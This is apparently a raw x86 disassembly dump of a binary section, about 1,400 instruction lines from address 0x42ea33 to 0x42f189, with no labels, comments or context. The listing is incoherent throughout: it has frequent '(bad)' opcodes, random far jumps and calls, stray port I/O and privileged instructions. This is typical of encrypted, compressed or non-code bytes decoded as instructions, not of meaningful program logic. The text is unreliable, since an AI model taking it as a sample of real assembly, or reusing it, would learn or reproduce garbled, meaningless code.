  42ea33:	scas   eax,DWORD PTR es:[edi]
  42ea34:	aam    0xc7
  42ea36:	or     DWORD PTR [edx-0x9],edx
  42ea39:	and    BYTE PTR [edx+0x4d629ce6],0xf8
  42ea40:	std    
  42ea41:	addr16 dec ebp
  42ea43:	push   ecx
  42ea44:	pusha  
  42ea45:	dec    eax
  42ea46:	ret    0x7ec0
  42ea49:	xor    esp,DWORD PTR [edx+0xe]
  42ea4c:	xor    eax,0xb285c7a2
  42ea51:	call   0x1c86cb4d
  42ea56:	repz sbb DWORD PTR [ebx-0x5f],0x6fc00f96
  42ea5e:	gs jno 0x42eaaa
  42ea61:	fstp   QWORD PTR [edi-0x5a]
  42ea64:	daa    
  42ea65:	cmp    bl,0x30
  42ea68:	lods   eax,DWORD PTR ds:[esi]
  42ea69:	jmp    0xb520:0x6b1c941e
  42ea70:	popf   
  42ea71:	sub    eax,0xf11854ae
  42ea76:	popa   
  42ea77:	pop    ecx
  42ea78:	loope  0x42eac4
  42ea7a:	add    al,0xd5
  42ea7c:	(bad)  
  42ea7d:	mov    ebp,0x219c05f7
  42ea82:	sbb    al,0xd9
  42ea84:	inc    edi
  42ea85:	inc    edx
  42ea86:	mov    edx,0x920e8bee
  42ea8b:	jnp    0x42eac6
  42ea8d:	mov    eax,ds:0xd7371c00
  42ea92:	out    0x4b,eax
  42ea94:	jbe    0x42ea18
  42ea96:	and    ah,BYTE PTR [ebp-0x4b]
  42ea99:	jbe    0x42ea89
  42ea9b:	and    DWORD PTR [ecx+edi*2+0x3a],edx
  42ea9f:	outs   dx,DWORD PTR ds:[esi]
  42eaa0:	push   esp
  42eaa1:	cmp    al,0xfd
  42eaa3:	adc    al,0xc
  42eaa5:	cmp    BYTE PTR ds:0x3aef4df,0x9a
  42eaac:	sbb    BYTE PTR [eax],al
  42eaae:	mov    ecx,0x89cc5213
  42eab3:	mov    bl,0xd9
  42eab5:	bnd jl 0x42eacb
  42eab8:	lock push es
  42eaba:	pop    ecx
  42eabb:	(bad)  
  42eabd:	das    
  42eabe:	add    eax,0x801039c0
  42eac3:	mov    esi,0xb6e57d72
  42eac8:	retf   0x8653
  42eacb:	or     al,0x37
  42eacd:	add    DWORD PTR [ebp-0x56124196],0xa4816f9f
  42ead7:	pop    esi
  42ead8:	xchg   BYTE PTR [edx+0x27],bl
  42eadb:	xlat   BYTE PTR ds:[ebx]
  42eadc:	shr    BYTE PTR [edx],cl
  42eade:	repz xor eax,0x705a8e32
  42eae4:	pop    ss
  42eae5:	jnp    0x42eb27
  42eae7:	lahf   
  42eae8:	mov    ah,0x9c
  42eaea:	mov    al,0x83
  42eaec:	ret    
  42eaed:	inc    esp
  42eaee:	iret   
  42eaef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eaf0:	pop    ebx
  42eaf1:	inc    esp
  42eaf2:	add    BYTE PTR [ebx-0x1a],cl
  42eaf5:	mov    BYTE PTR [ecx+edx*2-0x7d],bl
  42eaf9:	aas    
  42eafa:	xchg   edx,eax
  42eafb:	jbe    0x42ea86
  42eafd:	add    eax,0x4a69ae50
  42eb02:	aad    0x8
  42eb04:	bound  eax,QWORD PTR [esi+ebp*1-0x3e]
  42eb08:	cmp    ebx,DWORD PTR [ecx-0x3ca8a179]
  42eb0e:	mov    ebp,0x13fbd48c
  42eb13:	dec    esi
  42eb14:	ins    DWORD PTR es:[edi],dx
  42eb15:	add    eax,0x4bdb9d6e
  42eb1a:	push   eax
  42eb1b:	xor    BYTE PTR [ecx-0x7f],bl
  42eb1e:	inc    edx
  42eb1f:	xchg   ebx,eax
  42eb20:	or     al,0x39
  42eb22:	test   al,0xd9
  42eb24:	mov    ah,0xee
  42eb26:	add    edx,edx
  42eb28:	mov    edx,0x4a3b7b8
  42eb2d:	xchg   ecx,eax
  42eb2e:	add    BYTE PTR ds:0x8640507,dh
  42eb34:	clc    
  42eb35:	(bad)  
  42eb36:	hlt    
  42eb37:	das    
  42eb38:	dec    edi
  42eb39:	loope  0x42eb33
  42eb3b:	jno    0x42eb34
  42eb3d:	cs iret 
  42eb3f:	pop    ecx
  42eb40:	in     al,0xe3
  42eb42:	out    dx,al
  42eb43:	inc    edi
  42eb44:	test   eax,0x7795835f
  42eb49:	xchg   edi,eax
  42eb4a:	sbb    al,0x8b
  42eb4c:	and    BYTE PTR [ecx-0x73],al
  42eb4f:	sbb    eax,0xb66d8b68
  42eb54:	sbb    al,0xcf
  42eb56:	mov    ecx,0x695beba5
  42eb5b:	sub    edx,DWORD PTR [ebx]
  42eb5d:	int3   
  42eb5e:	jmp    0x42ebbb
  42eb60:	xor    DWORD PTR [ebx+0x5b],edx
  42eb63:	dec    edi
  42eb64:	xor    al,0xb4
  42eb66:	bound  esp,QWORD PTR [ebp-0x565e780c]
  42eb6c:	ror    DWORD PTR [ecx+0xf1a514],cl
  42eb72:	mov    bl,0x98
  42eb74:	fadd   st,st(0)
  42eb76:	ficomp WORD PTR es:[ebp*4-0x6f68451d]
  42eb7e:	jo     0x42ebeb
  42eb80:	mov    ds:0xe4298932,al
  42eb85:	inc    esp
  42eb86:	jbe    0x42eb15
  42eb88:	cli    
  42eb89:	xlat   BYTE PTR ds:[ebx]
  42eb8a:	retf   0x5580
  42eb8d:	dec    esi
  42eb8e:	es in  eax,0x1d
  42eb91:	imul   ecx,DWORD PTR [edx-0x77],0xbe99cb6b
  42eb98:	out    dx,eax
  42eb99:	pop    eax
  42eb9a:	mov    edx,0xcc0efa87
  42eb9f:	cmc    
  42eba0:	inc    ebx
  42eba1:	stos   DWORD PTR es:[edi],eax
  42eba2:	shl    BYTE PTR [ebx],cl
  42eba4:	pop    ss
  42eba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eba6:	ss jno 0x42ebfd
  42eba9:	dec    ebp
  42ebaa:	loope  0x42eb65
  42ebac:	repz jmp 0x371c9181
  42ebb2:	fwait
  42ebb3:	(bad)  
  42ebb4:	jmp    0x42ec03
  42ebb6:	xchg   edx,eax
  42ebb7:	lods   al,BYTE PTR ds:[esi]
  42ebb8:	in     eax,dx
  42ebb9:	pop    ebx
  42ebba:	and    al,0x69
  42ebbc:	add    ch,BYTE PTR es:[ecx+0x1e]
  42ebc0:	xchg   ebx,eax
  42ebc1:	and    BYTE PTR [ecx+0x79],0x7b
  42ebc5:	nop
  42ebc6:	test   al,0x6a
  42ebc8:	or     DWORD PTR [ebp+0x33],edx
  42ebcb:	cmp    al,0xd8
  42ebcd:	imul   esi
  42ebcf:	ret    
  42ebd0:	add    al,0x7d
  42ebd2:	adc    bl,ch
  42ebd4:	add    BYTE PTR [eax+0x6],ah
  42ebd7:	scas   al,BYTE PTR es:[edi]
  42ebd8:	or     DWORD PTR [ecx+eax*1+0x6],edx
  42ebdc:	or     al,0x69
  42ebde:	mov    edi,0x1e3d098a
  42ebe3:	or     al,0x89
  42ebe5:	xlat   BYTE PTR ds:[ebx]
  42ebe6:	nop
  42ebe7:	dec    edx
  42ebe8:	in     al,0x7d
  42ebea:	push   esp
  42ebeb:	ja     0x42ec6a
  42ebed:	aaa    
  42ebee:	in     al,dx
  42ebef:	jl     0x42ebdb
  42ebf1:	pop    esi
  42ebf2:	loopne 0x42ec6f
  42ebf4:	inc    esp
  42ebf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ebf6:	fild   QWORD PTR [esp+eax*4]
  42ebf9:	or     BYTE PTR [edi+0x6d],bl
  42ebfc:	fsub   QWORD PTR [esi-0x5407df95]
  42ec02:	add    DWORD PTR [ecx+0x663cad1d],0x14722a42
  42ec0c:	dec    edi
  42ec0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ec0e:	lock es aaa 
  42ec11:	xor    al,0x24
  42ec13:	dec    esp
  42ec14:	pop    ebp
  42ec15:	push   esi
  42ec16:	adc    eax,0x4aac489f
  42ec1b:	jnp    0x42ec6e
  42ec1d:	(bad)  
  42ec1e:	xchg   esp,eax
  42ec1f:	dec    edx
  42ec20:	pushf  
  42ec21:	xor    eax,0xee70800f
  42ec26:	push   eax
  42ec27:	sbb    BYTE PTR [edi],0x5c
  42ec2a:	cmp    al,0xd
  42ec2c:	mov    al,0x15
  42ec2e:	outs   dx,BYTE PTR ds:[esi]
  42ec2f:	jns    0x42ec41
  42ec31:	xor    eax,0xce83e711
  42ec36:	dec    ebx
  42ec37:	mov    BYTE PTR [edx-0x26587a72],al
  42ec3d:	scas   eax,DWORD PTR es:[edi]
  42ec3e:	fisttp QWORD PTR [eax+edx*4]
  42ec41:	mov    ch,0x2d
  42ec43:	xor    al,BYTE PTR [edi+0x5f71df72]
  42ec49:	jmp    0x42ec68
  42ec4b:	jl     0x42ec51
  42ec4d:	push   es
  42ec4e:	(bad)  
  42ec4f:	push   edi
  42ec50:	inc    eax
  42ec51:	pop    esi
  42ec52:	fsub   QWORD PTR [esi+0x459714eb]
  42ec58:	aad    0xe2
  42ec5a:	jne    0x42ec86
  42ec5c:	mov    dh,0x25
  42ec5e:	push   edi
  42ec5f:	stos   BYTE PTR es:[edi],al
  42ec60:	retf   0x802b
  42ec63:	shr    DWORD PTR [esi-0x12],0x76
  42ec67:	and    al,0xab
  42ec69:	mov    ch,0x24
  42ec6b:	and    BYTE PTR [ebx-0x36],bl
  42ec6e:	cmc    
  42ec6f:	scas   eax,DWORD PTR es:[edi]
  42ec70:	clc    
  42ec71:	xchg   esi,eax
  42ec72:	cmp    DWORD PTR [eax-0x5c],ecx
  42ec75:	mov    edx,0xfc9e23f3
  42ec7a:	add    al,0xc8
  42ec7c:	(bad)  [edx]
  42ec7e:	aaa    
  42ec7f:	mov    al,0x51
  42ec81:	(bad)  
  42ec82:	jl     0x42ec8d
  42ec84:	popf   
  42ec85:	inc    edi
  42ec86:	rcl    DWORD PTR cs:[eax-0x5ffdf661],1
  42ec8d:	or     ah,BYTE PTR [edi]
  42ec8f:	jno    0x42ec72
  42ec91:	xchg   ebp,eax
  42ec92:	je     0x42ecc3
  42ec94:	dec    ecx
  42ec95:	mov    bh,0x5f
  42ec97:	xor    BYTE PTR [ebp-0x16],ch
  42ec9a:	nop    DWORD PTR [ebx]
  42ec9d:	pop    es
  42ec9e:	mov    ebx,esp
  42eca0:	out    dx,eax
  42eca1:	cs pop es
  42eca3:	ror    DWORD PTR [ebp+ebp*8-0x11c471e0],cl
  42ecaa:	pop    edi
  42ecab:	out    0xed,al
  42ecad:	inc    ebx
  42ecae:	cmp    dh,BYTE PTR [edi-0x5c]
  42ecb1:	xor    bl,dh
  42ecb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecb4:	push   ss
  42ecb5:	pop    ss
  42ecb6:	inc    esp
  42ecb7:	jmp    0xb3f5:0xe375a961
  42ecbe:	or     al,0xce
  42ecc0:	add    ecx,DWORD PTR [esi+esi*2]
  42ecc3:	xchg   edx,eax
  42ecc4:	jae    0x42ece0
  42ecc6:	cs push 0x58b32b2e
  42eccc:	sahf   
  42eccd:	jmp    0xd9a6276
  42ecd2:	jno    0x42ec75
  42ecd4:	dec    ecx
  42ecd5:	pop    ss
  42ecd6:	dec    ebx
  42ecd7:	in     eax,0x90
  42ecd9:	inc    edx
  42ecda:	pop    ebp
  42ecdb:	pop    ds
  42ecdc:	ds push es
  42ecde:	loop   0x42eca7
  42ece0:	jae    0x42ecb9
  42ece2:	test   DWORD PTR [ebp+0x516b506b],ecx
  42ece8:	add    DWORD PTR [edi+eax*1+0x2a],ecx
  42ecec:	xor    eax,0xfdb3eb79
  42ecf1:	jecxz  0x42ed30
  42ecf3:	jecxz  0x42ecb9
  42ecf5:	shl    DWORD PTR [ecx+0xb05a3e7],0x74
  42ecfc:	jle    0x42eca6
  42ecfe:	mov    dh,0xe6
  42ed00:	scas   eax,DWORD PTR es:[edi]
  42ed01:	push   edx
  42ed02:	aas    
  42ed03:	xchg   ebp,eax
  42ed04:	and    al,dl
  42ed06:	arpl   WORD PTR [ebx-0x28b60a63],sp
  42ed0c:	sar    BYTE PTR [ebp-0x38],0xc
  42ed10:	lahf   
  42ed11:	sub    ch,cl
  42ed13:	test   DWORD PTR [edi],0x908e024c
  42ed19:	fistp  WORD PTR [esi+0x24ad5fd6]
  42ed1f:	lds    ecx,FWORD PTR [edi+0x62]
  42ed22:	rol    DWORD PTR [edi],0xce
  42ed25:	jge    0x42ed62
  42ed27:	push   ss
  42ed28:	pop    ebx
  42ed29:	aam    0x8c
  42ed2b:	cld    
  42ed2c:	std    
  42ed2d:	and    dl,BYTE PTR [ebp+eax*1-0x13016226]
  42ed34:	dec    ecx
  42ed35:	lea    ecx,[edx-0x36362ae0]
  42ed3b:	fidiv  WORD PTR [ecx]
  42ed3d:	adc    eax,0xb4de9f2d
  42ed42:	mov    dl,0x98
  42ed44:	inc    ebx
  42ed45:	nop
  42ed46:	es stc 
  42ed48:	lds    edx,FWORD PTR [edi+0x1a]
  42ed4b:	jo     0x42eda8
  42ed4d:	ja     0x42ed6e
  42ed4f:	pop    edx
  42ed50:	mov    dh,0x41
  42ed52:	(bad)  
  42ed53:	popa   
  42ed54:	fadd   DWORD PTR [ecx+0x46]
  42ed57:	sbb    ebx,DWORD PTR ds:0xbfa25119
  42ed5d:	aam    0xe2
  42ed5f:	mov    esp,0xef3304cd
  42ed64:	xchg   edx,eax
  42ed65:	inc    esi
  42ed66:	in     al,0x46
  42ed68:	addr16 add esi,edi
  42ed6b:	jl     0x42edad
  42ed6d:	int    0x84
  42ed6f:	jge    0x42ed1c
  42ed71:	xor    esp,DWORD PTR [edi-0x4c5db041]
  42ed77:	sbb    bl,BYTE PTR [ebp+0xb]
  42ed7a:	shl    BYTE PTR [ebp+edx*8+0xd],1
  42ed7e:	inc    esp
  42ed7f:	sbb    dh,BYTE PTR [ecx+0x75]
  42ed82:	add    ah,dl
  42ed84:	cmp    DWORD PTR ss:[eax],eax
  42ed87:	in     al,dx
  42ed88:	jnp    0x42edc9
  42ed8a:	call   0x3698:0x94625ed6
  42ed91:	fstp   QWORD PTR [edx+ecx*2-0x6e040bae]
  42ed98:	jge    0x42ed4d
  42ed9a:	aaa    
  42ed9b:	call   0x65b95b72
  42eda0:	aas    
  42eda1:	jmp    0x42ee0a
  42eda3:	fcomp  DWORD PTR [eax]
  42eda5:	lods   al,BYTE PTR ds:[esi]
  42eda6:	dec    esi
  42eda7:	cmp    DWORD PTR [ebp-0x30665f7c],ebx
  42edad:	push   ss
  42edae:	sbb    eax,0xd23a49c
  42edb3:	push   ebp
  42edb4:	xor    eax,0xe86ce471
  42edb9:	mov    ds:0x8398447,al
  42edbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42edbf:	bound  edi,QWORD PTR [edx+0x4b22c3b5]
  42edc5:	jnp    0x42ed92
  42edc7:	xor    DWORD PTR [ecx+0x24],edx
  42edca:	pop    edi
  42edcb:	ds mov bh,0x44
  42edce:	xor    ebp,DWORD PTR [edx-0x2eb700e7]
  42edd4:	jmp    0x42eda7
  42edd6:	sbb    edx,eax
  42edd8:	dec    edx
  42edd9:	aam    0x7b
  42eddb:	add    edx,edx
  42eddd:	xchg   edx,eax
  42edde:	mov    ?,WORD PTR [eax+esi*2]
  42ede1:	mov    dh,0xf0
  42ede3:	jmp    0xdc371c42
  42ede8:	fsubr  QWORD PTR [ecx]
  42edea:	jo     0x42ee03
  42edec:	jnp    0x42eda6
  42edee:	fs test al,0xa
  42edf1:	sbb    edx,DWORD PTR [ecx]
  42edf3:	repnz sti 
  42edf5:	mov    BYTE PTR [ecx+0x73263f77],dl
  42edfb:	xchg   edi,eax
  42edfc:	setb   BYTE PTR [eax-0xa]
  42ee00:	aaa    
  42ee01:	or     DWORD PTR [eax-0x20731d09],ebp
  42ee07:	mov    eax,ds:0xef422912
  42ee0c:	in     al,0xd5
  42ee0e:	mov    al,ds:0xc589cb50
  42ee13:	gs xor al,0x14
  42ee16:	in     al,dx
  42ee17:	imul   ebp,DWORD PTR [ebp-0x260fa22d],0x71
  42ee1e:	int    0x81
  42ee20:	adc    eax,0xe0ea140e
  42ee25:	(bad)  
  42ee26:	mov    esp,0xfbf71c29
  42ee2b:	mov    cs,esi
  42ee2d:	xchg   edx,eax
  42ee2e:	imul   ecx,DWORD PTR ds:0xa6ebef26,0x5cb42bb5
  42ee38:	lahf   
  42ee39:	mov    ebx,0x3e2d62a4
  42ee3e:	xchg   esi,eax
  42ee3f:	outs   dx,BYTE PTR ds:[esi]
  42ee40:	xchg   edi,eax
  42ee41:	push   ecx
  42ee42:	sub    eax,DWORD PTR [esp+ebx*4+0x12]
  42ee46:	add    ebx,0xffffffd8
  42ee49:	fwait
  42ee4a:	mov    dl,0xf4
  42ee4c:	inc    edx
  42ee4d:	sub    al,BYTE PTR [edx]
  42ee4f:	dec    ecx
  42ee50:	cs icebp 
  42ee52:	xchg   esi,eax
  42ee53:	push   eax
  42ee54:	les    edi,FWORD PTR [edx]
  42ee56:	stos   BYTE PTR es:[edi],al
  42ee57:	(bad)  
  42ee58:	jne    0x42edfb
  42ee5a:	aas    
  42ee5b:	ds loopne 0x42ee06
  42ee5e:	aam    0xd6
  42ee60:	pusha  
  42ee61:	dec    ebp
  42ee62:	xor    BYTE PTR [eax],bh
  42ee64:	mov    edx,0xedc6592
  42ee69:	lahf   
  42ee6a:	fild   QWORD PTR ds:0x2189d46f
  42ee70:	inc    esi
  42ee71:	jge    0x42ee2e
  42ee73:	inc    edi
  42ee74:	sub    eax,ebp
  42ee76:	pop    esi
  42ee77:	xchg   edi,eax
  42ee78:	adc    ebx,DWORD PTR [edi]
  42ee7a:	cmp    al,0x5a
  42ee7c:	aaa    
  42ee7d:	pop    edi
  42ee7e:	cli    
  42ee7f:	out    0x80,eax
  42ee81:	jle    0x42eee4
  42ee83:	lods   al,BYTE PTR ds:[esi]
  42ee84:	sub    DWORD PTR [edi],ebp
  42ee86:	retf   0x403f
  42ee89:	fimul  WORD PTR [ebp+ecx*2+0x19]
  42ee8d:	xchg   ch,bl
  42ee8f:	inc    edx
  42ee90:	or     BYTE PTR [esi],0xa0
  42ee93:	enter  0xb403,0x15
  42ee97:	ret    0x6c68
  42ee9a:	ror    BYTE PTR [ebp-0x6c0f9774],cl
  42eea0:	jno    0x42ee99
  42eea2:	arpl   WORD PTR [esi-0x70],cx
  42eea5:	cs pop edx
  42eea7:	inc    edx
  42eea8:	xor    WORD PTR [edi],dx
  42eeab:	fmul   QWORD PTR [ebx-0x48]
  42eeae:	pop    esi
  42eeaf:	jnp    0x42ef2a
  42eeb1:	cdq    
  42eeb2:	inc    eax
  42eeb3:	out    dx,al
  42eeb4:	into   
  42eeb5:	ds cmp eax,0x4e2f9c67
  42eebb:	into   
  42eebc:	cdq    
  42eebd:	and    ebx,DWORD PTR [ecx+0x16]
  42eec0:	mov    ah,0xd9
  42eec2:	loopne 0x42ef38
  42eec4:	mov    dh,0xab
  42eec6:	lea    ebp,[edi]
  42eec8:	ins    BYTE PTR es:[edi],dx
  42eec9:	pop    ecx
  42eeca:	aad    0x72
  42eecc:	sbb    BYTE PTR [eax-0x6a],ah
  42eecf:	sar    DWORD PTR [ebx],cl
  42eed1:	xor    DWORD PTR [edx],edi
  42eed3:	jae    0x42eea2
  42eed5:	cmp    ah,BYTE PTR [edi+0x6e]
  42eed8:	arpl   WORD PTR [ecx],bp
  42eeda:	ret    0x6712
  42eedd:	mov    ds:0x8184b44c,al
  42eee2:	sbb    ch,bl
  42eee4:	mov    edx,0x34a43490
  42eee9:	xchg   ebp,eax
  42eeea:	and    BYTE PTR [edx+0x66],0x7d
  42eeee:	imul   eax,DWORD PTR [edi-0x117aea70],0x4ac377b7
  42eef8:	mov    fs,WORD PTR [ecx-0x6f]
  42eefb:	sbb    al,0x88
  42eefd:	je     0x42ee98
  42eeff:	int3   
  42ef00:	call   0xfec:0x54c7812d
  42ef07:	add    ah,BYTE PTR [eax]
  42ef09:	sti    
  42ef0a:	popa   
  42ef0b:	mov    dh,ah
  42ef0d:	adc    BYTE PTR [esi],dl
  42ef0f:	pcmpeqd mm1,QWORD PTR [edx+0x27]
  42ef13:	sub    al,BYTE PTR [eax+edx*8-0x2adb8c40]
  42ef1a:	sub    DWORD PTR [esi-0x7b],eax
  42ef1d:	imul   esp,DWORD PTR [edi+edi*2],0xffffffc1
  42ef21:	pop    ecx
  42ef22:	push   DWORD PTR ds:0xb2c65076
  42ef28:	mov    bl,BYTE PTR [edx-0x64]
  42ef2b:	xchg   esp,eax
  42ef2c:	sub    ch,BYTE PTR [ebp+0x7d]
  42ef2f:	xor    BYTE PTR [ecx],bl
  42ef31:	cli    
  42ef32:	dec    edx
  42ef33:	mov    ah,0x89
  42ef35:	out    0x30,al
  42ef37:	std    
  42ef38:	jmp    0xaedb:0x5b812c39
  42ef3f:	loopne 0x42ef3c
  42ef41:	dec    ebx
  42ef42:	aam    0xe7
  42ef44:	test   bl,dh
  42ef46:	inc    ebp
  42ef47:	fwait
  42ef48:	xor    al,0xef
  42ef4a:	jge    0x42ef5c
  42ef4c:	jbe    0x42efa7
  42ef4e:	lods   al,BYTE PTR ds:[esi]
  42ef4f:	retf   
  42ef50:	lea    esp,[esi]
  42ef52:	sub    al,0x51
  42ef54:	js     0x42ef31
  42ef56:	pop    ds
  42ef57:	dec    edi
  42ef58:	jmp    0x42ef1c
  42ef5a:	test   DWORD PTR [ecx+0x7a63486c],ecx
  42ef60:	jno    0x42ef53
  42ef62:	pop    ss
  42ef63:	test   eax,0xbd2d2277
  42ef68:	xchg   edi,eax
  42ef69:	dec    esi
  42ef6a:	mov    ds:0xf6db3b33,al
  42ef6f:	lods   eax,DWORD PTR ds:[esi]
  42ef70:	cli    
  42ef71:	xor    BYTE PTR [edi-0x73a97e9c],al
  42ef77:	push   0xb
  42ef79:	pop    eax
  42ef7a:	pushf  
  42ef7b:	or     DWORD PTR [eax+eax*8+0x1a055444],0x7a
  42ef83:	outs   dx,BYTE PTR ds:[esi]
  42ef84:	mov    esi,0x46d19ad9
  42ef89:	xlat   BYTE PTR ds:[ebx]
  42ef8a:	cmc    
  42ef8b:	icebp  
  42ef8c:	cmc    
  42ef8d:	lea    esp,[esi]
  42ef8f:	test   al,0xe9
  42ef91:	addr16 je 0x42efba
  42ef94:	mov    al,0xbe
  42ef96:	or     DWORD PTR [esp+ebp*1-0x7a4e1820],edx
  42ef9d:	sar    DWORD PTR [esi+0x2f929ed5],0xff
  42efa4:	lds    edx,FWORD PTR [eax+0x44]
  42efa7:	out    0x1b,al
  42efa9:	and    eax,0x3c06feaa
  42efae:	xor    esp,esp
  42efb0:	clc    
  42efb1:	pop    eax
  42efb2:	ins    BYTE PTR es:[edi],dx
  42efb3:	xchg   edx,eax
  42efb4:	and    DWORD PTR [esp+eax*1],esi
  42efb7:	cmp    esi,edi
  42efb9:	popa   
  42efba:	pop    esp
  42efbb:	in     al,dx
  42efbc:	lods   al,BYTE PTR ds:[esi]
  42efbd:	outs   dx,BYTE PTR ds:[esi]
  42efbe:	sub    DWORD PTR [edi+0x3e],ebp
  42efc1:	nop
  42efc2:	inc    edx
  42efc3:	iret   
  42efc4:	nop
  42efc5:	dec    ebx
  42efc6:	cwde   
  42efc7:	inc    edx
  42efc8:	add    eax,0x1ce34e71
  42efcd:	and    BYTE PTR [edx-0x606afd16],0x29
  42efd4:	stos   BYTE PTR es:[edi],al
  42efd5:	rcl    DWORD PTR [ebp+ebp*1-0x3568c825],cl
  42efdc:	xchg   edx,eax
  42efdd:	jne    0x42efdd
  42efdf:	xchg   ebx,eax
  42efe0:	cdq    
  42efe1:	push   0x22
  42efe3:	in     eax,0x27
  42efe5:	mov    ds:0xb213f74f,al
  42efea:	les    edx,FWORD PTR [di]
  42efed:	icebp  
  42efee:	mov    ds:0x7b26ae84,eax
  42eff3:	(bad)  
  42eff4:	jns    0x42efec
  42eff6:	push   edx
  42eff7:	push   eax
  42eff8:	bnd jp 0x42efb9
  42effb:	shl    DWORD PTR [esi-0x6],1
  42effe:	int3   
  42efff:	sti    
  42f000:	enter  0xe3d,0xf3
  42f004:	test   BYTE PTR [esi],al
  42f006:	dec    eax
  42f007:	cmp    al,0x9a
  42f009:	repnz mov eax,0xc3130c97
  42f00f:	xchg   ebx,eax
  42f010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f011:	add    eax,0xad852165
  42f016:	push   ecx
  42f017:	inc    ebx
  42f018:	outs   dx,DWORD PTR ds:[esi]
  42f019:	dec    edx
  42f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f01b:	pop    ds
  42f01c:	and    eax,0xee047189
  42f021:	mov    bl,0xb0
  42f023:	adc    eax,0x86ddb7ae
  42f028:	sti    
  42f029:	cmp    BYTE PTR [ecx+0x22ed74d],dh
  42f02f:	mov    ds:0x3f5cef05,al
  42f034:	div    cl
  42f036:	(bad)  
  42f038:	mov    edx,0x866ea527
  42f03d:	sbb    esp,DWORD PTR [ebp-0x34]
  42f040:	sar    DWORD PTR [edx*2+0x138c2875],cl
  42f047:	retf   0x7055
  42f04a:	imul   ebp,DWORD PTR [edx-0x4e],0x38
  42f04e:	and    bh,BYTE PTR [ebp+0xf3d58e8]
  42f054:	pushf  
  42f055:	outs   dx,BYTE PTR ds:[esi]
  42f056:	inc    ebx
  42f057:	mov    ebp,DWORD PTR [ebx+ebp*2-0x4c1a9f98]
  42f05e:	mov    WORD PTR [esi],fs
  42f060:	repz add cl,cl
  42f063:	and    dh,BYTE PTR [esp+edi*2-0x521167a0]
  42f06a:	jle    0x42f081
  42f06c:	jmp    0x7b01:0x4082fdc3
  42f073:	dec    esi
  42f074:	out    0x35,eax
  42f076:	in     eax,dx
  42f077:	les    eax,FWORD PTR [eax-0x19]
  42f07a:	inc    esi
  42f07b:	lods   al,BYTE PTR ds:[esi]
  42f07c:	lock stos BYTE PTR es:[edi],al
  42f07e:	test   DWORD PTR [edi-0x33bf59b2],esi
  42f084:	mov    eax,ds:0x7b019d0a
  42f089:	cmp    BYTE PTR [eax-0x777c0744],0x55
  42f090:	jb     0x42f10a
  42f092:	jb     0x42f023
  42f094:	ret    
  42f095:	test   al,0x14
  42f097:	jmp    0x9383ec2b
  42f09c:	int3   
  42f09d:	mov    bl,0xb4
  42f09f:	push   ebx
  42f0a0:	mov    al,ds:0x17373eb3
  42f0a5:	jl     0x42f071
  42f0a7:	mov    dh,BYTE PTR [esi+0x4ef76a67]
  42f0ad:	jns    0x42f10f
  42f0af:	mov    dh,0xce
  42f0b1:	sub    eax,0x51bda2cd
  42f0b6:	call   0x22a6:0x68eb0aea
  42f0bd:	push   0x1b5b44b8
  42f0c2:	pop    edx
  42f0c3:	mov    cl,0xbe
  42f0c5:	jnp    0x42f0ae
  42f0c7:	pop    ds
  42f0c8:	or     dh,dh
  42f0ca:	pop    ds
  42f0cb:	sti    
  42f0cc:	jg     0x42f0bc
  42f0ce:	mov    edi,0x8c23a800
  42f0d3:	adc    al,0x87
  42f0d5:	sub    al,0x76
  42f0d7:	scas   al,BYTE PTR es:[edi]
  42f0d8:	mov    edi,0x3848c032
  42f0dd:	idiv   DWORD PTR [ecx]
  42f0df:	pop    edi
  42f0e0:	pop    ss
  42f0e1:	push   ds
  42f0e2:	push   ds
  42f0e3:	neg    DWORD PTR [edx+0x637211ef]
  42f0e9:	mov    ecx,0xf285b6ea
  42f0ee:	mov    ebp,edi
  42f0f0:	add    ebx,DWORD PTR [ecx-0x17]
  42f0f3:	sub    BYTE PTR [eax+0x3266fbb5],ch
  42f0f9:	mov    cl,0x4
  42f0fb:	test   esi,esp
  42f0fd:	mov    dh,0xfc
  42f0ff:	inc    esp
  42f100:	mov    ss,WORD PTR [ebx]
  42f102:	repz mov dl,BYTE PTR ss:[ebx+0x5a33e111]
  42f10a:	xor    esi,DWORD PTR [eax-0x67]
  42f10d:	add    dh,bl
  42f10f:	sbb    bh,bl
  42f111:	xchg   edx,eax
  42f112:	sahf   
  42f113:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f114:	jne    0x42f192
  42f116:	cmp    ebx,DWORD PTR [ecx+edi*2-0x717d173c]
  42f11d:	mov    ebp,0x71213a29
  42f122:	sub    al,0x8b
  42f124:	and    eax,0x8d453e3a
  42f129:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f12a:	mov    al,0x29
  42f12c:	or     ecx,DWORD PTR [ebx]
  42f12e:	jbe    0x42f1ab
  42f130:	push   0x5451820d
  42f135:	scas   eax,DWORD PTR es:[edi]
  42f136:	scas   eax,DWORD PTR es:[edi]
  42f137:	xchg   esp,eax
  42f138:	inc    esp
  42f139:	pop    edx
  42f13a:	pop    eax
  42f13b:	sbb    BYTE PTR [edi+0x14a4b875],al
  42f141:	xor    BYTE PTR [ecx+0x56324599],bl
  42f147:	add    eax,0x372fafca
  42f14c:	adc    edx,DWORD PTR [edx-0x50]
  42f14f:	dec    edx
  42f150:	sub    eax,0x8c3ca1a2
  42f155:	retf   
  42f156:	iret   
  42f157:	js     0x42f1ce
  42f159:	sar    DWORD PTR [edi+0x1d19dbc9],cl
  42f15f:	pushf  
  42f160:	jno    0x42f10f
  42f162:	popf   
  42f163:	sahf   
  42f164:	int3   
  42f165:	sahf   
  42f166:	fiadd  DWORD PTR [edx-0x33]
  42f169:	and    eax,0x9e7a74a9
  42f16e:	inc    eax
  42f16f:	mov    ecx,0xce1dfb4e
  42f174:	jecxz  0x42f155
  42f176:	js     0x42f143
  42f178:	int    0x39
  42f17a:	add    eax,0x5e781c7e
  42f17f:	mov    DWORD PTR [bp+si],esp
  42f182:	mov    ecx,0x909e19e3
  42f187:	test   al,0xff
  42f189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
